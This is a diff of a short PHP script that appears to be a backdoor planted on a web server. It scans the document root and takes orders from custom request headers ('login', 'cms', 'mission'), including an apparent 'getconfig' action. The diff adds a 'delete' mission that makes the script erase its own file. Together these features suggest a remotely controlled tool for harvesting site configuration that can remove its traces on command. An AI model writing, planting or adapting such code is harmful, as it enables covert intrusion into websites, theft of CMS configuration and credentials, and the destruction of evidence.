@@ -1,6 +1,4 @@
 <?php
-
-
 $ROOT=$_SERVER['DOCUMENT_ROOT'];
 $DIR=scandir($ROOT);
 
@@ -11,8 +9,6 @@ $LOGIN=$headers['login'];
 $CMS=$headers['cms'];
 $MISSION=$headers['mission'];
 
-
-// fwrite($file, "$LOGIN\r\n$UG\r\n$CMS\r\n$MISSION");
 
 switch ($MISSION) {
 	case 'getconfig':
@@ -30,19 +26,10 @@ switch ($MISSION) {
 				}
 			}
 		}
+		break;
+	case 'delete':
+		unlink(__FILE__);
+		break;
 	
 }
-
-
-
-
-
-
-
-
-
-
-
-
-// fclose($file);
 ?>
